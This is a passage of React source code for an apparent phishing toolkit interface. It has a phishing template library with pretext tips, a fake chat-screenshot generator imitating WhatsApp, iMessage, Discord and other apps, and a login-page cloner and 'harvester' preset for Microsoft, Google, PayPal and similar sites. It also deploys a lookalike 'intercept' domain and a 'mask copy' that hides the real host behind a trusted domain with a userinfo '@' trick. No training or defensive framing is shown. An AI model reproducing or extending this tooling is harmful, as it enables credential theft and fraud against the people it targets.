                                            onChange={(e) => setTargetInfo({ ...targetInfo, [field.key]: e.target.value })}
                                            className="w-full bg-black/60 border border-white/10 rounded-lg p-2 text-xs text-purple-300 focus:border-purple-500 focus:outline-none transition-all placeholder-white/10"
                                        />
                                    </div>
                                ))}
                                <button
                                    onClick={addToDossier}
                                    className="w-full bg-purple-600/20 hover:bg-purple-600 border border-purple-500/40 p-3 rounded-xl text-xs font-black uppercase tracking-widest transition-all flex items-center justify-center gap-2 text-purple-400 hover:text-white mt-4"
                                >
                                    <Save size={14} /> Commit to Dossier
                                </button>
                            </div>
                        </motion.div>

                        <div className="bg-gradient-to-br from-red-900/10 to-transparent border border-red-500/20 rounded-2xl p-4">
                            <div className="flex items-center gap-2 text-red-500 font-black text-[10px] uppercase mb-2">
                                <ShieldAlert size={14} /> Critical Intel
                            </div>
                            <p className="text-[10px] text-white/40 leading-relaxed italic">
                                "The target prioritizes internal {targetInfo?.company || 'Corporate'} communications. Use VPN or IT pretexts for maximum impact."
                            </p>
                        </div>
                    </aside>

                    {/* MAIN CONTENT AREA */}
                    <div className="lg:col-span-3">
                        <AnimatePresence mode="wait">
                            {/* --- 1. PHISHING COMMAND CENTER --- */}
                            {activeTab === 'phishing' && (
                                <motion.div key="phish" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.95 }} className="space-y-6">
                                    <SectionHeader icon={Mail} title="ULTRA PHISHING LIBRARY" desc="Professional templates & live injection engine" />

                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                        {/* Template Selector */}
                                        <div className="space-y-3 h-[600px] overflow-y-auto pr-2 custom-scrollbar">
                                            {PHISHING_TEMPLATES.map(t => (
                                                <button
                                                    key={t.id}
                                                    onClick={() => setSelectedTemplate(t)}
                                                    className={`w-full text-left p-4 rounded-2xl border transition-all relative group ${selectedTemplate.id === t.id ? 'bg-purple-600/10 border-purple-500 shadow-xl' : 'bg-white/5 border-white/10 hover:border-white/20'}`}
                                                >
                                                    <div className="flex justify-between items-center mb-1">
                                                        <span className={`text-[10px] font-black uppercase px-2 py-0.5 rounded ${t.category === 'Banking' ? 'bg-red-500/20 text-red-400' : 'bg-blue-500/20 text-blue-400'}`}>
                                                            {t.category}
                                                        </span>
                                                        <Eye size={14} className="opacity-0 group-hover:opacity-100 text-purple-400" />
                                                    </div>
                                                    <h4 className="text-sm font-black text-white mb-1">{t.name}</h4>
                                                    <p className="text-[10px] text-white/40 truncate italic">{t.subject}</p>
                                                </button>
                                            ))}
                                        </div>

                                        {/* Live Preview Console */}
                                        <div className="bg-black/80 border border-white/10 rounded-2xl flex flex-col shadow-2xl h-[600px]">
                                            <div className="bg-white/5 p-4 border-b border-white/10 flex justify-between items-center">
                                                <div className="flex gap-1.5">
                                                    <div className="w-3 h-3 rounded-full bg-red-500/40" />
                                                    <div className="w-3 h-3 rounded-full bg-yellow-500/40" />
                                                    <div className="w-3 h-3 rounded-full bg-green-500/40" />
                                                </div>
                                                <span className="text-[10px] font-black text-white/30 tracking-[0.3em] uppercase">RENDER_CONSOLE</span>
                                                <button onClick={() => copyToClipboard(renderTemplateContent(selectedTemplate.content))} className="p-2 hover:bg-white/10 rounded-lg text-purple-400">
                                                    <Copy size={16} />
                                                </button>
                                            </div>
                                            <div className="p-6 space-y-6 overflow-y-auto">
                                                <div className="space-y-3 pb-6 border-b border-white/5 font-sans">
                                                    <div className="flex items-start gap-4">
                                                        <span className="text-[10px] font-black text-white/20 uppercase w-16">Subject:</span>
                                                        <span className="text-sm text-white font-bold">{renderTemplateContent(selectedTemplate.subject)}</span>
                                                    </div>
                                                    <div className="flex items-start gap-4">
                                                        <span className="text-[10px] font-black text-white/20 uppercase w-16">From:</span>
                                                        <span className="text-xs text-purple-400">{renderTemplateContent(selectedTemplate.sender)}</span>
                                                    </div>
                                                </div>
                                                <div className="text-sm text-white/80 leading-relaxed whitespace-pre-wrap font-sans selection:bg-purple-500/30">
                                                    {renderTemplateContent(selectedTemplate.content)}
                                                </div>
                                                <div className="mt-8 p-4 bg-purple-950/20 border border-purple-500/20 rounded-xl relative overflow-hidden">
                                                    <div className="absolute top-0 right-0 p-1 opacity-10"><Zap size={40} /></div>
                                                    <h5 className="text-[10px] font-black text-purple-400 uppercase flex items-center gap-2 mb-2">
                                                        <Zap size={12} /> Strategic Alignment
                                                    </h5>
                                                    <p className="text-[11px] text-purple-200/50 italic">{selectedTemplate.tips}</p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </motion.div>
                            )}

                            {/* --- 2. CHAT STUDIO PRO (REALISM ENGINE) --- */}
                            {activeTab === 'chat' && (
                                <motion.div key="chat" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -20 }} className="space-y-8">
                                    <SectionHeader icon={MessageSquare} title="FAKE CHAT STUDIO PRO" desc="High-fidelity social proof & pretext generator" />

                                    <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
                                        {/* CONTROLS SIDEBAR */}
                                        <div className="lg:col-span-4 space-y-6">
                                            <div className="bg-white/5 border border-white/10 rounded-3xl p-6 backdrop-blur-xl">
                                                <h3 className="text-xs font-black uppercase text-white/40 mb-4 tracking-widest flex items-center gap-2">
                                                    <Layout size={12} /> Platform Vector
                                                </h3>
                                                <div className="grid grid-cols-3 gap-2 mb-8">
                                                    {[
                                                        { id: 'whatsapp', label: 'WhatsApp', color: 'bg-[#25D366]' },
                                                        { id: 'messenger', label: 'Messenger', color: 'bg-[#0084FF]' },
                                                        { id: 'sms', label: 'iMessage', color: 'bg-[#34C759]' },
                                                        { id: 'telegram', label: 'Telegram', color: 'bg-[#0088cc]' },
                                                        { id: 'twitter', label: 'Twitter', color: 'bg-[#1DA1F2]' },
                                                        { id: 'linkedin', label: 'LinkedIn', color: 'bg-[#0077b5]' },
                                                        { id: 'discord', label: 'Discord', color: 'bg-[#5865F2]' }
                                                    ].map(p => (
                                                        <button
                                                            key={p.id}
                                                            onClick={() => setChatPlatform(p.id)}
                                                            className={`p-3 rounded-xl border flex flex-col items-center justify-center gap-2 transition-all group ${chatPlatform === p.id
                                                                ? 'bg-white/10 border-white/40 shadow-xl'
                                                                : 'bg-black/20 border-white/5 hover:bg-white/5'}`}
                                                        >
                                                            <div className={`w-3 h-3 rounded-full ${p.color} shadow-lg`} />
                                                            <span className={`text-[9px] font-black uppercase ${chatPlatform === p.id ? 'text-white' : 'text-white/30 group-hover:text-white/60'}`}>{p.label}</span>
                                                        </button>
                                                    ))}
                                                </div>

                                                <h3 className="text-xs font-black uppercase text-white/40 mb-4 tracking-widest flex items-center gap-2">
                                                    <UserCheck size={12} /> Target Identity
                                                </h3>
                                                <div className="space-y-3 mb-8">
                                                    <div>
                                                        <label className="text-[9px] uppercase font-bold text-white/20 mb-1 block">Display Name</label>
                                                        <input
                                                            type="text"
                                                            value={chatTarget}
                                                            onChange={(e) => setChatTarget(e.target.value)}
                                                            className="w-full bg-black/40 border border-white/10 rounded-xl p-3 text-sm text-white focus:border-purple-500 outline-none"
                                                        />
                                                    </div>
                                                </div>

                                                <h3 className="text-xs font-black uppercase text-white/40 mb-4 tracking-widest flex items-center gap-2">
                                                    <Terminal size={12} /> Message Injection
                                                </h3>
                                                <div className="space-y-3">
                                                    <textarea
                                                        value={newMessage}
                                                        onChange={(e) => setNewMessage(e.target.value)}
                                                        placeholder="Type message content..."
                                                        className="w-full bg-black/40 border border-white/10 rounded-xl p-3 text-xs h-24 focus:border-purple-500 transition-all resize-none text-white placeholder-white/20"
                                                    />
                                                    <div className="grid grid-cols-2 gap-2">
                                                        <button onClick={() => addChatMessage('target')} className="bg-white/5 hover:bg-white/10 border border-white/5 p-3 rounded-xl text-[10px] font-black uppercase text-blue-400 flex items-center justify-center gap-2">
                                                            <ArrowLeft size={12} /> Receive (Gray)
                                                        </button>
                                                        <button onClick={() => addChatMessage('me')} className="bg-purple-600 hover:bg-purple-500 p-3 rounded-xl text-[10px] font-black uppercase text-white shadow-lg shadow-purple-900/20 flex items-center justify-center gap-2">
                                                            Send (Color) <Send size={12} />
                                                        </button>
                                                    </div>
                                                    <button onClick={() => setChatMessages([])} className="w-full py-3 text-red-400/60 hover:text-red-400 text-[10px] font-black uppercase transition-all flex items-center justify-center gap-2 border-t border-white/5 mt-4">
                                                        <Trash2 size={12} /> Reset Conversation
                                                    </button>
                                                </div>
                                            </div>
                                        </div>

                                        {/* PREVIEW CANVAS */}
                                        <div className="lg:col-span-8 flex items-center justify-center bg-black/40 rounded-3xl border border-white/5 p-8 relative overflow-hidden">
                                            <div className="absolute inset-0 opacity-20" style={{ backgroundImage: 'radial-gradient(#4c1d95 1px, transparent 1px)', backgroundSize: '20px 20px' }} />

                                            {/* PHONE CONTAINER */}
                                            <div className="w-[350px] h-[700px] bg-black rounded-[55px] border-[14px] border-[#1a1a1a] shadow-[0_0_60px_rgba(0,0,0,0.8),inset_0_0_20px_rgba(0,0,0,0.5)] overflow-hidden flex flex-col relative ring-1 ring-white/10 transform transition-all hover:scale-[1.02]">
                                                {/* Dynamic Island / Notch */}
                                                <div className="absolute top-0 left-1/2 -translate-x-1/2 w-32 h-7 bg-black rounded-b-2xl z-50 flex items-center justify-center">
                                                    <div className="w-16 h-4 bg-[#0a0a0a] rounded-full flex items-center justify-end px-2">
                                                        <div className="w-1 h-1 rounded-full bg-green-500/50 animate-pulse" />
                                                    </div>
                                                </div>

                                                {(() => {
                                                    // --- PLATFORM STYLES ENGINE ---
                                                    const getStyles = (p) => {
                                                        const s = {
                                                            whatsapp: {
                                                                statusBar: 'text-white bg-[#075e54]',
                                                                header: 'bg-[#075e54] text-white',
                                                                bg: '#e5ddd5',
                                                                bgImg: 'url("https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png")',
                                                                bubbleMe: 'bg-[#dcf8c6] text-black rounded-tr-none',
                                                                bubbleThem: 'bg-white text-black rounded-tl-none',
                                                                input: 'bg-white',
                                                                accent: '#075e54',
                                                                ticks: true
                                                            },
                                                            telegram: {
                                                                statusBar: 'text-white bg-[#17212b]',
                                                                header: 'bg-[#17212b] text-white',
                                                                bg: '#0e1621',
                                                                bgImg: 'url("https://telegram.org/file/464001088/1/bD0X8c8_2s0.86566/d5bfa7e671c6d32890")',
                                                                bubbleMe: 'bg-[#2b5278] text-white rounded-br-none',
                                                                bubbleThem: 'bg-[#182533] text-white rounded-bl-none',
                                                                input: 'bg-[#17212b]',
                                                                accent: '#2b5278',
                                                                ticks: true
                                                            },
                                                            messenger: {
                                                                statusBar: 'text-black bg-white',
                                                                header: 'bg-white text-black shadow-sm',
                                                                bg: '#ffffff',
                                                                bgImg: 'none',
                                                                bubbleMe: 'bg-[#0084ff] text-white rounded-br-md',
                                                                bubbleThem: 'bg-[#e4e6eb] text-black rounded-bl-md',
                                                                input: 'bg-white',
                                                                accent: '#0084ff',
                                                                ticks: true
                                                            },
                                                            sms: {
                                                                statusBar: 'text-black bg-[#f2f2f7]',
                                                                header: 'bg-[#f2f2f7] text-black backdrop-blur-xl bg-opacity-90',
                                                                bg: '#ffffff',
                                                                bgImg: 'none',
                                                                bubbleMe: 'bg-[#34c759] text-white rounded-2xl',
                                                                bubbleThem: 'bg-[#e9e9eb] text-black rounded-2xl',
                                                                input: 'bg-[#f2f2f7]',
                                                                accent: '#34c759',
                                                                ticks: false,
                                                                label: 'Text Message'
                                                            },
                                                            twitter: {
                                                                statusBar: 'text-white bg-black',
                                                                header: 'bg-black text-white border-b border-gray-800',
                                                                bg: '#000000',
                                                                bgImg: 'none',
                                                                bubbleMe: 'bg-[#1d9bf0] text-white rounded-2xl rounded-br-sm',
                                                                bubbleThem: 'bg-[#2f3336] text-white rounded-2xl rounded-bl-sm',
                                                                input: 'bg-black border-t border-gray-800',
                                                                accent: '#1d9bf0',
                                                                ticks: true,
                                                                label: 'Start a message'
                                                            },
                                                            linkedin: {
                                                                statusBar: 'text-black bg-white',
                                                                header: 'bg-white text-black border-b border-gray-200',
                                                                bg: '#f3f2ef',
                                                                bgImg: 'none',
                                                                bubbleMe: 'bg-[#eaf4fe] text-black rounded-tr-none border border-black/5',
                                                                bubbleThem: 'bg-white text-black rounded-tl-none border border-black/5',
                                                                input: 'bg-white border-t border-gray-200',
                                                                accent: '#0a66c2',
                                                                ticks: false,
                                                                label: 'Write a message...'
                                                            },
                                                            discord: {
                                                                statusBar: 'text-white bg-[#202225]',
                                                                header: 'bg-[#313338] text-white shadow-md',
                                                                bg: '#313338',
                                                                bgImg: 'none',
                                                                bubbleMe: 'hover:bg-[#2e3035] w-full mt-0.5 pl-2', // Discord msg style
                                                                bubbleThem: 'hover:bg-[#2e3035] w-full mt-0.5 pl-2',
                                                                input: 'bg-[#313338] px-4',
                                                                accent: '#5865f2',
                                                                ticks: false,
                                                                isDiscord: true
                                                            }
                                                        };
                                                        return s[p] || s.whatsapp;
                                                    };

                                                    const ui = getStyles(chatPlatform);

                                                    return (
                                                        <>
                                                            {/* 1. STATUS BAR */}
                                                            <div className={`h-[44px] flex justify-between items-end px-8 pb-2 text-[12px] font-bold z-40 select-none ${ui.statusBar}`}>
                                                                <span>9:41</span>
                                                                <div className="flex items-center gap-1.5">
                                                                    <Signal size={14} />
                                                                    <Wifi size={14} />
                                                                    <Battery size={18} />
                                                                </div>
                                                            </div>

                                                            {/* 2. APP HEADER */}
                                                            <div className={`h-[60px] flex items-center gap-3 px-4 z-30 select-none ${ui.header}`}>
                                                                <ArrowLeft size={20} className={chatPlatform === 'sms' ? 'text-blue-500' : ''} />

                                                                {chatPlatform === 'sms' ? (
                                                                    <div className="flex-1 flex flex-col items-center justify-center mr-6">
                                                                        <div className="w-10 h-10 bg-gray-300 rounded-full flex items-center justify-center text-white font-bold text-lg mb-1 overflow-hidden">
                                                                            <Users size={24} />
                                                                        </div>
                                                                        <span className="text-xs text-black font-medium">{chatTarget} <span className="text-gray-400">&gt;</span></span>
                                                                    </div>
                                                                ) : (
                                                                    <>
                                                                        <div className="relative">
                                                                            <div className={`w-9 h-9 rounded-full flex items-center justify-center text-lg font-bold overflow-hidden ${chatPlatform === 'messenger' ? 'ring-2 ring-blue-500' : 'bg-gray-200 text-gray-500'}`}>
                                                                                {chatPlatform === 'whatsapp' || chatPlatform === 'telegram' ? (
                                                                                    <img src={`https://ui-avatars.com/api/?name=${chatTarget}&background=random`} alt="" className="w-full h-full object-cover" />
                                                                                ) : (
                                                                                    chatTarget[0]
                                                                                )}
                                                                            </div>
                                                                            {['whatsapp', 'messenger', 'instagram'].includes(chatPlatform) && (
                                                                                <div className="absolute bottom-0 right-0 w-2.5 h-2.5 bg-green-500 rounded-full border-2 border-white" />
                                                                            )}
                                                                        </div>
                                                                        <div className="flex-1">
                                                                            <div className="font-bold text-sm leading-tight flex items-center gap-1">
                                                                                {chatTarget}
                                                                                {(chatPlatform === 'twitter' || chatPlatform === 'instagram') && <div className="w-3 h-3 bg-blue-500 rounded-full flex items-center justify-center"><Check size={8} className="text-white" /></div>}
                                                                            </div>
                                                                            <div className="text-[10px] opacity-70">{chatPlatform === 'whatsapp' || chatPlatform === 'telegram' ? 'online' : chatPlatform === 'twitter' ? '@' + chatTarget.replace(' ', '').toLowerCase() : 'Active now'}</div>
                                                                        </div>
                                                                        <div className="flex gap-4 opacity-80">
                                                                            {chatPlatform === 'whatsapp' || chatPlatform === 'messenger' ? (
                                                                                <>
                                                                                    <Phone size={20} className={chatPlatform === 'messenger' ? 'text-blue-500' : ''} />
                                                                                    <Video size={20} className={chatPlatform === 'messenger' ? 'text-blue-500' : ''} />
                                                                                </>
                                                                            ) : (
                                                                                <MoreVertical size={20} />
                                                                            )}
                                                                        </div>
                                                                    </>
                                                                )}
                                                            </div>

                                                            {/* 3. MESSAGE BODY */}
                                                            <div className="flex-1 overflow-y-auto p-4 space-y-2 relative" style={{ backgroundColor: ui.bg, backgroundImage: ui.bgImg, backgroundSize: 'cover' }}>
                                                                {/* Encryption Notices */}
                                                                {chatPlatform === 'whatsapp' && (
                                                                    <div className="flex justify-center mb-6 mt-2">
                                                                        <div className="bg-[#fff5c4] text-[#5e5e5e] text-[9px] px-3 py-1.5 rounded-lg shadow-sm text-center max-w-[240px] leading-tight">
                                                                            Messages and calls are end-to-end encrypted. No one outside of this chat, not even WhatsApp, can read or listen to them. Tap to learn more.
                                                                        </div>
                                                                    </div>
                                                                )}

                                                                {chatMessages.map((msg, idx) => (
                                                                    <div key={msg.id} className={`flex ${msg.sender === 'me' ? 'justify-end' : 'justify-start'} ${ui.isDiscord ? 'mb-0' : 'mb-1'}`}>

                                                                        {/* Avatar for Messenger/Discord Receive */}
                                                                        {msg.sender === 'target' && (chatPlatform === 'messenger' || ui.isDiscord) && (
                                                                            <div className="w-7 h-7 rounded-full bg-gray-300 mr-2 flex-shrink-0 overflow-hidden mt-1">
                                                                                <img src={`https://ui-avatars.com/api/?name=${chatTarget}&background=random`} alt="" />
                                                                            </div>
                                                                        )}

                                                                        {/* The Bubble */}
                                                                        <div className={`relative max-w-[75%] ${msg.sender === 'me' ? ui.bubbleMe : ui.bubbleThem} ${ui.isDiscord ? 'bg-transparent text-white p-1 hover:bg-[#2e3035] !max-w-full !rounded-none flex items-start gap-3' : 'px-3 py-1.5 shadow-sm text-xs'}`}>

                                                                            {/* Discord Specific Layout */}
                                                                            {ui.isDiscord ? (
                                                                                <>
                                                                                    {msg.sender === 'target' && (idx === 0 || chatMessages[idx - 1].sender !== 'target') ? (
                                                                                        <div className="w-10 h-10 rounded-full bg-blue-500 flex-shrink-0 mt-0.5 overflow-hidden">
                                                                                            <img src={`https://ui-avatars.com/api/?name=${chatTarget}&background=random`} alt="" />
                                                                                        </div>
                                                                                    ) : msg.sender === 'me' && (idx === 0 || chatMessages[idx - 1].sender !== 'me') ? (
                                                                                        <div className="w-10 h-10 rounded-full bg-purple-500 flex-shrink-0 mt-0.5 overflow-hidden">
                                                                                            <img src={`https://ui-avatars.com/api/?name=Me&background=random`} alt="" />
                                                                                        </div>
                                                                                    ) : <div className="w-10 shrink-0" />} {/* Indent for consecutive messages */}

                                                                                    <div className="flex-1">
                                                                                        {(idx === 0 || chatMessages[idx - 1].sender !== msg.sender) && (
                                                                                            <div className="flex items-center gap-2 mb-0.5">
                                                                                                <span className="font-bold text-white text-[13px]">{msg.sender === 'me' ? 'Operator' : chatTarget}</span>
                                                                                                <span className="text-[10px] text-gray-400">{msg.time}</span>
                                                                                            </div>
                                                                                        )}
                                                                                        <p className="text-[13px] text-[#dcddde] font-sans leading-normal">{msg.text}</p>
                                                                                    </div>
                                                                                </>
                                                                            ) : (
                                                                                /* STANDARD BUBBLE LAYOUT */
                                                                                <>
                                                                                    <p className={`font-sans leading-relaxed text-[13px] ${chatPlatform === 'sms' && msg.sender === 'me' ? 'text-white' : ''}`}>
                                                                                        {msg.text}
                                                                                    </p>
                                                                                    <div className={`flex items-center justify-end gap-1 mt-1 ${chatPlatform === 'messenger' ? 'hidden' : ''}`}>
                                                                                        <span className={`text-[9px] ${msg.sender === 'me' && chatPlatform === 'whatsapp' ? 'text-[#34b7f1]/60' : 'text-inherit opacity-50'}`}>
                                                                                            {msg.time}
                                                                                        </span>
                                                                                        {msg.sender === 'me' && ui.ticks && (
                                                                                            <CheckCheck size={12} className={chatPlatform === 'whatsapp' ? 'text-[#34b7f1]' : chatPlatform === 'telegram' ? 'text-[#4ea4f5]' : 'text-white/70'} />
                                                                                        )}
                                                                                    </div>
                                                                                </>
                                                                            )}
                                                                        </div>
                                                                    </div>
                                                                ))}

                                                                {/* "Delivered" for SMS */}
                                                                {chatPlatform === 'sms' && chatMessages.length > 0 && chatMessages[chatMessages.length - 1].sender === 'me' && (
                                                                    <div className="text-[10px] text-gray-400 font-bold text-right pr-2">Delivered</div>
                                                                )}
                                                            </div>

                                                            {/* 4. INPUT AREA */}
                                                            <div className={`p-2 flex items-center gap-2 z-30 ${ui.input}`}>
                                                                <div className="p-2 text-blue-500">
                                                                    {chatPlatform === 'whatsapp' ? <Plus size={20} /> : chatPlatform === 'messenger' ? <Plus size={20} /> : <Camera size={20} className="text-gray-400" />}
                                                                </div>
                                                                <div className={`flex-1 rounded-full px-4 py-2 text-[13px] flex items-center justify-between ${chatPlatform === 'discord' ? 'bg-[#383a40] text-gray-400 rounded-lg' : chatPlatform === 'twitter' ? 'bg-black border border-gray-800 rounded-full' : 'bg-white border border-gray-200 shadow-sm'}`}>
                                                                    <span className="opacity-50">{ui.label || 'Message...'}</span>
                                                                    {chatPlatform === 'whatsapp' && <Paperclip size={18} className="opacity-50" />}
                                                                </div>
                                                                <div className="p-2 text-blue-500">
                                                                    {chatPlatform === 'whatsapp' ? <Mic size={20} /> : <Send size={20} className={chatPlatform === 'telegram' ? 'text-[#2b5278]' : ''} />}
                                                                </div>
                                                            </div>

                                                            {/* Home Bar (iOS) */}
                                                            <div className={`h-5 w-full flex justify-center items-center z-50 ${ui.input}`}>
                                                                <div className="w-32 h-1 bg-gray-300 rounded-full mb-2" />
                                                            </div>
                                                        </>
                                                    );
                                                })()}
                                            </div>
                                        </div>
                                    </div>
                                </motion.div>
                            )}

                            {/* --- 3. WEB CLONER STUDIO --- */}
                            {activeTab === 'cloner' && (
                                <motion.div key="cloner" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="space-y-8">
                                    <SectionHeader icon={Monitor} title="WEB CLONER & HARVESTER" desc="Landing page replication & data capture node" />

                                    <div className="bg-white/5 border border-white/10 rounded-2xl p-8 backdrop-blur-3xl shadow-2xl">
                                        <div className="flex flex-col md:flex-row gap-6 items-end">
                                            <div className="flex-1 space-y-2">
                                                <label className="text-[10px] font-black uppercase text-white/30 tracking-widest flex items-center gap-2">
                                                    <Globe size={12} /> Target URL to Clone
                                                </label>
                                                <input
                                                    type="text"
                                                    value={clonerUrl}
                                                    onChange={(e) => setClonerUrl(e.target.value)}
                                                    className="w-full bg-black/60 border border-white/10 rounded-xl p-4 text-sm text-blue-400 focus:border-blue-500 focus:outline-none transition-all font-mono"
                                                    placeholder="https://example.com/login"
                                                />
                                            </div>
                                            <button
                                                onClick={runCloner}
                                                disabled={clonerStatus === 'CLONING'}
                                                className={`px-8 h-[52px] rounded-xl font-black uppercase text-xs tracking-widest transition-all flex items-center gap-2 ${clonerStatus === 'CLONING' ? 'bg-white/5 text-white/20' : 'bg-blue-600 hover:bg-blue-500 text-white shadow-lg shadow-blue-900/40'}`}
                                            >
                                                {clonerStatus === 'CLONING' ? <RefreshCw size={16} className="animate-spin" /> : <Plus size={16} />}
                                                {clonerStatus === 'CLONING' ? 'REPLICATING...' : 'CLONE SITE'}
                                            </button>
                                        </div>

                                        <div className="mt-6">
                                            <label className="text-[10px] font-black uppercase text-white/30 tracking-widest block mb-3">Detected Platform (Mockup Override)</label>
                                            <div className="flex flex-wrap gap-2">
                                                {Object.keys(CLONE_MOCKUPS).map(p => (
                                                    <button
                                                        key={p}
                                                        onClick={() => {
                                                            setClonerPlatform(p);
                                                            setCampaignPlatform(p); // SYNC: Ensure message updates too
                                                            setCustomCampaignMessage(''); // RESET: Allow getProfessionalPretext to take over
                                                            const platformUrls = {
                                                                microsoft: 'https://login.microsoftonline.com',
                                                                facebook: 'https://www.facebook.com/login',
                                                                google: 'https://accounts.google.com/ServiceLogin',
                                                                netflix: 'https://www.netflix.com/login',
                                                                instagram: 'https://www.instagram.com/accounts/login/',
                                                                x: 'https://x.com/i/flow/login',
                                                                linkedin: 'https://www.linkedin.com/login',
                                                                github: 'https://github.com/login',
                                                                discord: 'https://discord.com/login',
                                                                paypal: 'https://www.paypal.com/signin',
                                                                spotify: 'https://accounts.spotify.com/en/login',
                                                                shahid: 'https://shahid.mbc.net/login',
                                                                watchit: 'https://www.watchit.com/signin',
                                                                yangoplay: 'https://yango.com/login',
                                                                anghami: 'https://play.anghami.com/login',
                                                                deezer: 'https://www.deezer.com/login',
                                                                generic: 'https://example.com/login'
                                                            };
                                                            if (platformUrls[p]) setClonerUrl(platformUrls[p]);
                                                        }}
                                                        className={`px-3 py-1.5 rounded-lg border text-[9px] font-black uppercase transition-all ${clonerPlatform === p ? 'bg-blue-600 border-blue-400 text-white shadow-lg' : 'bg-white/5 border-white/10 text-white/40 hover:text-white'}`}
                                                    >
                                                        {p}
                                                    </button>
                                                ))}
                                            </div>
                                        </div>

                                        {clonerStatus !== 'IDLE' && (
                                            <div className="mt-8 space-y-4">
                                                <div className="bg-black/80 border border-white/10 rounded-xl p-4 font-mono text-[10px] h-48 overflow-y-auto custom-scrollbar shadow-inner">
                                                    {clonerLogs.map((log, i) => (
                                                        <div key={i} className={`${log.startsWith('[') ? 'text-blue-400' : 'text-white/40'} mb-1`}>
                                                            <span className="text-white/20 mr-2">[{new Date().toLocaleTimeString([], { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' })}]</span>
                                                            {log}
                                                        </div>
                                                    ))}
                                                    {clonerStatus !== 'READY' && <div className="text-blue-400 animate-pulse mt-2">_ PROCESSING...</div>}
                                                </div>

                                                {clonerStatus === 'READY' && (
                                                    <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="space-y-4">
                                                        <div className="p-4 bg-white/5 border border-white/10 rounded-2xl">
                                                            <div className="flex justify-between items-center mb-2">
                                                                <span className="text-[10px] font-black uppercase text-white/40 tracking-widest">Clone Fidelity</span>
                                                                <span className="text-[10px] font-black text-green-400">98.4% [PROTECTED]</span>
                                                            </div>
                                                            <div className="h-1 bg-white/5 rounded-full overflow-hidden">
                                                                <motion.div initial={{ width: 0 }} animate={{ width: '98.4%' }} className="h-full bg-gradient-to-r from-blue-500 to-green-500 shadow-[0_0_10px_rgba(34,197,94,0.5)]" />
                                                            </div>
                                                        </div>

                                                        <motion.div className="p-6 bg-green-500/10 border border-green-500/20 rounded-2xl flex items-center justify-between">
                                                            <div className="flex items-center gap-4">
                                                                <div className="w-12 h-12 bg-green-500/20 rounded-full flex items-center justify-center text-green-500 shadow-[0_0_20px_rgba(34,197,94,0.3)]">
                                                                    <CheckCircle size={28} />
                                                                </div>
                                                                <div>
                                                                    <div className="text-white font-black text-sm uppercase">Clone Instance Ready</div>
                                                                    <div className="text-[10px] text-green-500/60 font-mono tracking-tighter">
                                                                        INTERCEPT NODE: http://auth-verify.{(targetInfo?.company || 'Operative').toLowerCase().replace(/ /g, '')}-secure.net/login
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div className="flex gap-2">
                                                                <button
                                                                    onClick={() => setShowPreview(true)}
                                                                    className="px-4 py-2 bg-white/5 hover:bg-white/10 rounded-lg text-xs font-black uppercase text-white/60"
                                                                >
                                                                    Preview
                                                                </button>
                                                                <button
                                                                    onClick={handleDeploy}
                                                                    disabled={isDeployed}
                                                                    className={`px-5 py-2 rounded-lg text-xs font-black uppercase shadow-lg ${isDeployed ? 'bg-green-500/20 text-green-500/50 cursor-not-allowed' : 'bg-green-600 hover:bg-green-500 text-white shadow-green-900/40'}`}
                                                                >
                                                                    {isDeployed ? 'Deployed' : 'Deploy'}
                                                                </button>
                                                            </div>
                                                        </motion.div>
                                                    </motion.div>
                                                )}
                                            </div>
                                        )}
                                    </div>

                                    {/* Campaign Center & Live Link */}
                                    {isDeployed && (
                                        <motion.div initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} className="grid grid-cols-1 md:grid-cols-3 gap-6">
                                            <div className="md:col-span-2 bg-gradient-to-br from-purple-900/40 to-blue-900/20 border border-purple-500/20 rounded-2xl p-6 shadow-2xl">
                                                <h3 className="text-sm font-black uppercase text-purple-400 mb-6 flex items-center gap-2">
                                                    <Share2 size={16} /> Campaign Delivery Center
                                                </h3>
                                                <div className="space-y-6">
                                                    <div className="bg-black/40 p-4 rounded-xl border border-white/5 font-mono text-xs break-all">
                                                        <div className="flex justify-between items-center mb-2">
                                                            <span className="text-white/20 uppercase underline tracking-widest">Live Intercept URL</span>
                                                            <button
                                                                onClick={handleDeploy}
                                                                className="flex items-center gap-1.5 px-3 py-1 bg-purple-600/20 hover:bg-purple-600/40 text-purple-400 rounded-lg transition-all border border-purple-500/20 text-[10px] uppercase font-black"
                                                            >
                                                                <RefreshCw size={12} className={clonerStatus === 'CLONING' ? 'animate-spin' : ''} /> Update Link
                                                            </button>
                                                        </div>
                                                        <div className="flex items-center gap-3">
                                                            <span className="text-blue-400 flex-1">{clonerDeployedUrl || '--- NOT GENERATED ---'}</span>
                                                            <div className="flex gap-2">
                                                                <button
                                                                    onClick={handleStealthDeploy}
                                                                    disabled={isStealthLoading}
                                                                    className={`px-3 py-1 rounded-lg border transition-all text-[10px] uppercase font-black flex items-center gap-1.5 ${isStealthLoading ? 'opacity-50' : 'bg-red-600/20 hover:bg-red-600/40 text-red-400 border-red-500/20 shadow-lg shadow-red-900/20'}`}
                                                                    title="Shorten & Mask"
                                                                >
                                                                    <Zap size={12} className={isStealthLoading ? 'animate-pulse' : ''} /> Stealth Mode
                                                                </button>
                                                                <button
                                                                    onClick={() => {
                                                                        if (!clonerDeployedUrl) return;
                                                                        const targetHostname = new URL(clonerUrl).hostname;
                                                                        const maskedUrl = `https://${targetHostname}@${clonerDeployedUrl.replace(/^https?:\/\//, '')}`;
                                                                        navigator.clipboard.writeText(maskedUrl);
                                                                        toast('H-F Mask Copy!', 'success');
                                                                    }}
                                                                    className="px-2 py-1 bg-blue-600/20 hover:bg-blue-600/40 text-blue-400 rounded-lg border border-blue-500/20 text-[10px] uppercase font-black flex items-center gap-1"
                                                                    title="Authentic Domain Mask"
                                                                >
                                                                    <Shield size={10} /> Mask Copy
                                                                </button>
